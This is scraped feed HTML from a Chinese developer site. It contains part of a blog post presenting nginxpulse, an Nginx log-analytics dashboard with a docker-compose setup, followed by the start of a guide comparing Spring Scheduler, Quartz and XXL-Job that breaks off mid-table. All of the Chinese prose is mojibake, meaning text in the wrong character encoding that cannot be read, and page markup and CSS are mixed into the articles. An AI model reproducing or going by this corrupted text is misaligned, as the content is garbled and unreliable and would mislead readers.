<p>æ—¢ç„¶æ‰¾ä¸åˆ°åˆé€‚çš„ï¼Œé‚£å°±è‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªå§ï¼</p>
<h2 data-id="heading-1">å®ç°æ•ˆæœ</h2>
<p>åšäº†4ä¸ªæ¨¡å—å¯¹æ—¥å¿—æ•°æ®è¿›è¡Œåˆ†æã€‚</p>
<ul>
<li>è®¿é—®æ¦‚å†µ</li>
<li>æ•°æ®æ—¥æŠ¥</li>
<li>å®æ—¶è®¿é—®</li>
<li>è®¿é—®æ˜ç»†</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/911a2101b9024fe4919fb8bd613304d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=RcaE9N8vokbi5OudGmyN6V%2FkhAI%3D" alt="image-20260108124900609" loading="lazy"/></p>
<h3 data-id="heading-2">è®¿é—®æ¦‚å†µ</h3>
<p>æ¦‚å†µæ¨¡å—ä¸­ï¼Œåšäº†8ä¸ªç»´åº¦çš„æ•°æ®åˆ†æã€‚</p>
<h4 data-id="heading-3">æ ¸å¿ƒæŒ‡æ ‡</h4>
<p>åœ¨è¿™ä¸ªç»´åº¦ä¸­ï¼Œé’ˆå¯¹httpçŠ¶æ€ç ã€æµè§ˆé‡ã€è®¿å®¢æ•°ã€ä¼šè¯æ•°åšäº†æ›´ç»†è‡´çš„åˆ’åˆ†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f168bf5334d4c9db898072cf3d57062~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=Rtz2ae7gIa1NtDUe7ojsRMkwv8w%3D" alt="image-20260108125517344" loading="lazy"/></p>
<p>æ¯ä¸€ä¸ªåˆ’åˆ†ä¸­ï¼Œåœ¨è¯¦æƒ…é¢æ¿é‡Œï¼Œéƒ½å¯ä»¥çœ‹åˆ°è¿™ä¸ªè®¿å®¢åœ¨ä»€ä¹ˆæ—¶é—´åšäº†ä»€ä¹ˆäº‹æƒ…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d20d35c6946f4535a1b91786ed52ee9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=uVARW%2FMiCyGCLMC8C3Gv1asKj%2BA%3D" alt="image-20260108125954027" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b18fa3d7e76b41e58e32ccbaab1ae804~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=DAt%2F7%2Bhj%2FjgXLt3dWi1YdcdRYXY%3D" alt="image-20260108130323366" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b966189560a4ebb9090d549c94c87a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=mX6IOOg4SOHN9GwQG26F0eWDJn0%3D" alt="image-20260108130405011" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/beed1130896b447ba441c7e14dc52eb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=%2Fd6jOYuzbrhdY5Rp%2BKMCcE6M6DM%3D" alt="image-20260108130452437" loading="lazy"/></p>
<h4 data-id="heading-4">è¶‹åŠ¿åˆ†æ &amp; æ–°è€è®¿å®¢</h4>
<p>è¿™ä¸€éƒ¨åˆ†å¯ä»¥çœ‹åˆ°æ¯å¤©çš„è®¿é—®è¶‹åŠ¿ä»¥åŠå½“å¤©ä¸å‰ä¸€å¤©çš„æ–°è€è®¿å®¢å æ¯”ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98ab43663d3a4c82aa216cc548ed6a6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=%2BRuSX04hqA4Uz8OUYE9pN%2BFpBnM%3D" alt="image-20260108130725966" loading="lazy"/></p>
<h4 data-id="heading-5">æ¥è·¯ã€å—è®¿é¡µã€å…¥å£é¡µ</h4>
<p>è¿™éƒ¨åˆ†å¯ä»¥çœ‹åˆ°è®¿å®¢çš„æ¥æºï¼Œä»¥åŠæ¯ä¸ªè·¯å¾„çš„è®¿é—®æ¬¡æ•°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a927b142042743489225abc3cd6cf66d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=8loK5dPbQe741IvA2Ou49%2BxJgjo%3D" alt="image-20260108131048943" loading="lazy"/></p>
<h4 data-id="heading-6">åœ°åŸŸ &amp; ç»ˆç«¯è®¾å¤‡</h4>
<p>è¿™éƒ¨åˆ†å¯ä»¥çœ‹åˆ°æ¯ä¸ªçœä»½çš„è®¿é—®æƒ…å†µä»¥åŠè®¿é—®è®¾å¤‡çš„åˆ†å¸ƒæƒ…å†µã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3681f72c2d946baa87219178f2f9fb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=HtHntBZI9KXCPpqFYmA1i%2FZ2RBc%3D" alt="image-20260108131213706" loading="lazy"/></p>
<h3 data-id="heading-7">æ•°æ®æ—¥æŠ¥</h3>
<p>åœ¨è¿™ä¸ªæ¨¡å—ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ¯å¤©çš„æµè§ˆé‡ã€è®¿å®¢æ•°ã€å¹³å‡è®¿é—®æ—¶é•¿ç­‰ä¿¡æ¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/753b668bc809488b8c7213b5d07fde80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=lTY9GWlDm0K0YfIOtmgXd1k%2B%2FMo%3D" alt="image-20260108134815067" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d1e37a06c68484d809d33f4c0ce829c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=8KvnNraZ4KhfmUCFfCASNYU58bc%3D" alt="image-20260108140538356" loading="lazy"/></p>
<h3 data-id="heading-8">å®æ—¶è®¿é—®</h3>
<p>åœ¨è¿™ä¸ªæ¨¡å—é‡Œï¼Œå¯ä»¥æŸ¥çœ‹æœ€è¿‘5/15/30åˆ†é’Ÿå†…çš„è®¿é—®æƒ…å†µ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a20c57929b7248d5b647ccb45ed9525c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=qsYAgvZkpjfmnnRqdg5cWDMpzLQ%3D" alt="image-20260108141207205" loading="lazy"/></p>
<h3 data-id="heading-9">è®¿é—®æ˜ç»†</h3>
<p>è¿™ä¸ªæ¨¡å—å°±ä»¥è¡¨æ ¼çš„å½¢å¼å±•ç¤ºæ¯ä¸€æ¡æ—¥å¿—ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7061d17ae0a4813b7a3dc6a56de2a6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461706&amp;x-signature=eSK9jQvqngUmuwYRZ4GwpZPcSVk%3D" alt="image-20260108141436301" loading="lazy"/></p>
<h2 data-id="heading-10">å¦‚ä½•ä½¿ç”¨</h2>
<p>ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œæˆ‘å·²ç»å°†è¿™ä¸ªé¡¹ç›®æ‰“åŒ…æˆé•œåƒå‘å¸ƒåˆ°dockerhubä¸Šäº†ï¼Œé•œåƒåä¸º<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.docker.com%2Frepository%2Fdocker%2Fmagiccoders%2Fnginxpulse%2Fgeneral" target="_blank" title="https://hub.docker.com/repository/docker/magiccoders/nginxpulse/general" ref="nofollow noopener noreferrer">magiccoders/nginxpulse</a>ï¼Œå¯ä»¥é€šè¿‡dockerçš„å½¢å¼ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥é€šè¿‡docker composeçš„å½¢å¼ä½¿ç”¨ã€‚</p>
<p>éœ€è¦ä¼ å…¥çš„å‚æ•°ï¼š</p>
<ul>
<li>WEBSITES å®ƒçš„å€¼æ˜¯ä¸ªæ•°ç»„ï¼Œä¸€ä¸ªå¯¹è±¡å°±æ˜¯ä¸€ä¸ªç½‘ç«™ï¼Œéœ€è¦ä¼ å…¥ç½‘ç«™åã€æ—¥å¿—è·¯å¾„ã€ç½‘å€ï¼ˆæˆ–è€…å†…ç½‘ipï¼Œä¸»è¦ç”¨äºç«™å†…/ç«™å¤–çš„åŒºåˆ†ï¼‰</li>
<li>ports ç«¯å£æ˜ å°„ï¼Œå®¹å™¨å†…æš´éœ²å‡ºæ¥çš„ç«¯å£æ˜¯8088</li>
<li>volumes æ–‡ä»¶æŒ‚è½½ï¼Œè¿™é‡Œéœ€è¦æŒ‚è½½ï¼šæ—¥å¿—æ–‡ä»¶ã€å®¹å™¨å†…äº§ç”Ÿçš„æ•°æ®æ–‡ä»¶ã€æ—¶åŒº</li>
</ul>
<p>æ­¤å¤„æˆ‘ä»¥docker composeçš„å½¢å¼ä¸¾ä¾‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3"</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">nginxpulse:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">magiccoders/nginxpulse:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">local_nginxpulse</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9200:8088"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">WEBSITES:</span> <span class="hljs-string">'[{"name":"ç¥å¥‡çš„ç¨‹åºå‘˜","logPath":"/var/log/nginx/access.log","domains":["kaisir.cn","www.kaisir.cn"]}]'</span> <span class="hljs-comment">#domainsç”¨äºâ€œæ¥æºï¼ˆrefererï¼‰ç»Ÿè®¡â€çš„ç«™å†…/ç«™å¤–åˆ†ç±»</span>
      <span class="hljs-attr">PV_EXCLUDE_IPS:</span> <span class="hljs-string">'["127.0.0.1", "::1", "10.10.0.1", "192.168.30.21"]'</span> <span class="hljs-comment">#pvç»Ÿè®¡æ—¶éœ€è¦æ’é™¤çš„ip</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx_data/logs/all/access.log:/var/log/nginx/access.log</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginxpulse_data:/app/nginxpulse_data</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
</code></pre>
<h2 data-id="heading-11">å†™åœ¨æœ€å</h2>
<p>è‡³æ­¤ï¼Œæ–‡ç« å°±åˆ†äº«å®Œæ¯•äº†ã€‚</p>
<p>æˆ‘æ˜¯<strong>ç¥å¥‡çš„ç¨‹åºå‘˜</strong>ï¼Œä¸€ä½å‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆã€‚</p>
<p>å¦‚æœä½ å¯¹æˆ‘æ„Ÿå…´è¶£ï¼Œè¯·ç§»æ­¥æˆ‘çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kaisir.cn%2F" target="_blank" title="https://www.kaisir.cn/" ref="nofollow noopener noreferrer">ä¸ªäººç½‘ç«™</a>ï¼Œè¿›ä¸€æ­¥äº†è§£ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®šæ—¶ä»»åŠ¡å®æˆ˜æŒ‡å—ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼ï¼Œè¦†ç›–Spring Scheduler/Quartz/XXL-Jo]]></title>    <link>https://juejin.cn/post/7592765004807159859</link>    <guid>https://juejin.cn/post/7592765004807159859</guid>    <pubDate>2026-01-08T07:44:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807159859" data-draft-id="7592710766009942026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®šæ—¶ä»»åŠ¡å®æˆ˜æŒ‡å—ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼ï¼Œè¦†ç›–Spring Scheduler/Quartz/XXL-Jo"/> <meta itemprop="keywords" content="åç«¯,åˆ†å¸ƒå¼"/> <meta itemprop="datePublished" content="2026-01-08T07:44:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å›å®¶è·¯ä¸Šç»•äº†å¼¯"/> <meta itemprop="url" content="https://juejin.cn/user/536217404587134"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®šæ—¶ä»»åŠ¡å®æˆ˜æŒ‡å—ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼ï¼Œè¦†ç›–Spring Scheduler/Quartz/XXL-Jo
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/536217404587134/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å›å®¶è·¯ä¸Šç»•äº†å¼¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:44:16.000Z" title="Thu Jan 08 2026 07:44:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®šæ—¶ä»»åŠ¡å®æˆ˜æŒ‡å—ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼ï¼Œè¦†ç›–Spring Scheduler/Quartz/XXL-Job</h2>
<p>åœ¨åç«¯å¼€å‘ä¸­ï¼Œå®šæ—¶ä»»åŠ¡æ˜¯ä¸å¯æˆ–ç¼ºçš„æ ¸å¿ƒç»„ä»¶â€”â€”æ•°æ®å®šæ—¶æ¸…ç†ã€æ¯æ—¥æŠ¥è¡¨ç”Ÿæˆã€å®šæ—¶æ¨é€é€šçŸ¥ã€è®¢å•è¶…æ—¶å…³é—­ç­‰åœºæ™¯ï¼Œéƒ½ç¦»ä¸å¼€å®šæ—¶ä»»åŠ¡çš„æ”¯æŒã€‚ä½†å®é™…å¼€å‘ä¸­ï¼Œå¾ˆå¤šå¼€å‘è€…åªåœç•™åœ¨â€œèƒ½ç”¨â€çš„å±‚é¢ï¼Œé¢å¯¹â€œä»»åŠ¡å¹¶å‘å†²çªâ€â€œåˆ†å¸ƒå¼éƒ¨ç½²é‡å¤æ‰§è¡Œâ€â€œä»»åŠ¡ç›‘æ§å‘Šè­¦â€ç­‰é—®é¢˜æ—¶æŸæ‰‹æ— ç­–ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬ä»åŸºç¡€åˆ°è¿›é˜¶ï¼Œå…¨é¢è®²è§£å®šæ—¶ä»»åŠ¡çš„å®ç°æ–¹æ¡ˆã€å®æˆ˜æŠ€å·§ä¸é¿å‘æŒ‡å—ï¼Œè¦†ç›–å•æœºåˆ°åˆ†å¸ƒå¼çš„å…¨åœºæ™¯éœ€æ±‚ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€å…ˆææ‡‚ï¼šå®šæ—¶ä»»åŠ¡çš„æ ¸å¿ƒä»·å€¼ä¸åº”ç”¨åœºæ™¯</h3>
<p>å®šæ—¶ä»»åŠ¡æœ¬è´¨æ˜¯â€œæŒ‰é¢„è®¾æ—¶é—´è§„åˆ™è‡ªåŠ¨æ‰§è¡Œçš„ä»£ç é€»è¾‘â€ï¼Œå…¶æ ¸å¿ƒä»·å€¼åœ¨äºâ€œè§£æ”¾äººå·¥ã€ä¿éšœä¸šåŠ¡å®šæ—¶é—­ç¯â€ã€‚å¸¸è§åº”ç”¨åœºæ™¯å¯åˆ†ä¸º5ç±»ï¼š</p>
<ul>
<li><strong>æ•°æ®æ²»ç†ç±»</strong>ï¼šæ¯æ—¥å‡Œæ™¨æ¸…ç†è¿‡æœŸæ—¥å¿—ã€æ— æ•ˆè®¢å•ï¼›å®šæœŸå½’æ¡£å†å²æ•°æ®ï¼ˆå¦‚å°†3ä¸ªæœˆå‰çš„è®¢å•æ•°æ®è¿ç§»è‡³å†å²åº“ï¼‰ï¼›</li>
<li><strong>ä¸šåŠ¡é—­ç¯ç±»</strong>ï¼šè®¢å•åˆ›å»ºå30åˆ†é’Ÿæœªæ”¯ä»˜è‡ªåŠ¨å…³é—­ï¼›ä¼šå‘˜åˆ°æœŸå‰3å¤©å‘é€ç»­è´¹æé†’ï¼›</li>
<li><strong>ç»Ÿè®¡æŠ¥è¡¨ç±»</strong>ï¼šæ¯æ—¥å‡Œæ™¨ç”Ÿæˆå‰ä¸€å¤©çš„é”€å”®æŠ¥è¡¨ã€ç”¨æˆ·æ´»è·ƒæŠ¥è¡¨ï¼›æ¯æœˆç”Ÿæˆæœˆåº¦ç»è¥åˆ†ææŠ¥å‘Šï¼›</li>
<li><strong>ç³»ç»Ÿè¿ç»´ç±»</strong>ï¼šå®šæ—¶æ£€æŸ¥æœåŠ¡å¥åº·çŠ¶æ€ï¼›å®šæœŸå¤‡ä»½æ•°æ®åº“ï¼›æ¸…ç†ç¼“å­˜ç¢ç‰‡ï¼›</li>
<li><strong>æ¶ˆæ¯æ¨é€ç±»</strong>ï¼šå®šæ—¶æ¨é€æ¯æ—¥æ—©å®‰æ¶ˆæ¯ã€è¥é”€æ´»åŠ¨é€šçŸ¥ï¼›å®šæ—¶åŒæ­¥ç¬¬ä¸‰æ–¹æ•°æ®ï¼ˆå¦‚åŒæ­¥ç‰©æµä¿¡æ¯ï¼‰ã€‚</li>
</ul>
<p>ä¸åŒåœºæ™¯å¯¹å®šæ—¶ä»»åŠ¡çš„è¦æ±‚ä¸åŒï¼šç®€å•åœºæ™¯åªéœ€â€œæŒ‰æ—¶æ‰§è¡Œâ€ï¼Œå¤æ‚åœºæ™¯åˆ™éœ€è¦è€ƒè™‘â€œé«˜å¯ç”¨ã€æ— é‡å¤ã€å¯ç›‘æ§ã€å¯é‡è¯•â€ã€‚</p>
<h3 data-id="heading-2">äºŒã€å®šæ—¶ä»»åŠ¡çš„3ç§æ ¸å¿ƒå®ç°æ–¹æ¡ˆï¼šé€‰å‹å¯¹æ¯”</h3>
<p>åç«¯å®šæ—¶ä»»åŠ¡çš„å®ç°æ–¹æ¡ˆæœ‰å¾ˆå¤šï¼Œä»ç®€å•åˆ°å¤æ‚å¯åˆ†ä¸º3ä¸ªå±‚çº§ï¼Œä¸åŒæ–¹æ¡ˆé€‚é…ä¸åŒçš„ä¸šåŠ¡è§„æ¨¡ï¼š</p>





























<table><thead><tr><th>å®ç°æ–¹æ¡ˆ</th><th>æ ¸å¿ƒä¼˜åŠ¿</th><th>å±€é™æ€§</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>Spring Schedulerï¼ˆ@Scheduledï¼‰</td><td>1. é›¶ä¾èµ–ï¼ŒSpring BootåŸç”Ÿæ”¯æŒï¼›2. é…ç½®ç®€å•ï¼Œæ³¨è§£å¼å¼€å‘ï¼›3. è½»é‡é«˜æ•ˆï¼Œæ— é¢å¤–éƒ¨ç½²æˆæœ¬</td><td>1. ä¸æ”¯æŒåˆ†å¸ƒå¼éƒ¨ç½²ï¼ˆæ˜“é‡å¤æ‰§è¡Œï¼‰ï¼›2. æ— å†…ç½®ç›‘æ§ã€é‡è¯•æœºåˆ¶ï¼›3. ä»»åŠ¡ä¾èµ–ã€åŠ¨æ€è°ƒæ•´èƒ½åŠ›å¼±</td><td>å•æœºéƒ¨ç½²ã€ç®€å•å®šæ—¶ä»»åŠ¡ï¼ˆå¦‚å•æœºæœåŠ¡çš„æ—¥å¿—æ¸…ç†ï¼‰</td></tr><tr><td>Quartz</td><td>1. åŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒå¤æ‚è°ƒåº¦è§„åˆ™ï¼ˆå¦‚æ—¥å†å¼è°ƒåº¦ï¼‰ï¼›2. æ”¯æŒæŒä¹…åŒ–ï¼ˆä»»åŠ¡ä¿¡æ¯å­˜å…¥æ•°æ®åº“ï¼‰ï¼›3. æ”¯æŒé›†ç¾¤éƒ¨ç½²ï¼ˆè§£å†³é‡å¤æ‰§è¡Œï¼‰ï¼›4. æ”¯æŒä»»åŠ¡ä¼˜å…ˆçº§ã€é‡è¯•</td><td>1. é…ç½®å¤æ‚ï¼Œä»£ç ä¾µå…¥æ€§è¾ƒå¼ºï¼›2. æ— å†…ç½®ç›‘æ§å‘Šè­¦ï¼Œéœ€è‡ªè¡Œå®ç°ï¼›3. åˆ†å¸ƒå¼åœºæ™¯ä¸‹è¿ç»´æˆæœ¬è¾ƒé«˜</td><td>å•æœº/é›†ç¾¤éƒ¨ç½²ã€å¤æ‚è°ƒåº¦è§„åˆ™çš„ä»»åŠ¡ï¼ˆå¦‚æŒ‰å·¥ä½œæ—¥æ‰§è¡Œã€ä»»åŠ¡ä¾èµ–ï¼‰</td></tr><tr><td>XXL-Jobï¼ˆåˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦å¹³å°ï¼‰</td><td>1. åˆ†å¸ƒå¼éƒ¨ç½²æ— é‡å¤æ‰§è¡Œï¼›2. 